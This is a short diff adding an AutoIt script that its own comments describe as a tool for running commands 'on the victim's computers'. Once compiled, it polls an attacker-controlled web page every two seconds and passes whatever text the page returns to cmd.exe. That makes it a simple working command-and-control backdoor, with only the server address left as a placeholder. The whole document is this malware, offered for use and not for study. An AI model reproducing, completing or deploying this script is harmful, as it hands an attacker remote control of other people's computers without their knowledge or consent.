@@ -1,0 +1,25 @@
+;AUTOIT SCRIPT, COMPILE THIS INTO AN EXE FILE, VISIT https://www.autoitscript.com/site/autoit/downloads/ TO GET AUTOIT
+;link to webpage is a link to an api page that displays the command you want to execute on the victim's computers, otherwise make the page display just "no" (without the quotes)
+;made with ❤ by untitled
+While 1
+   Sleep(2000)
+   loop()
+WEnd
+Func loop()
+   $oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
+   $oHTTP.Open("GET", "<<<INSERT LINK TO WEBPAGE>>>", False)
+
+   $oHTTP.Send()
+   $oReceived = $oHTTP.ResponseText
+   $oStatusCode = $oHTTP.Status
+
+   If $oStatusCode == 200 then
+	  If $oReceived == "no" Then
+		 ;done
+	  Else
+		 ;run command
+		 $CMD = $oReceived
+		 RunWait(@ComSpec & " /c " & $CMD)
+	  EndIf
+   EndIf
+EndFunc
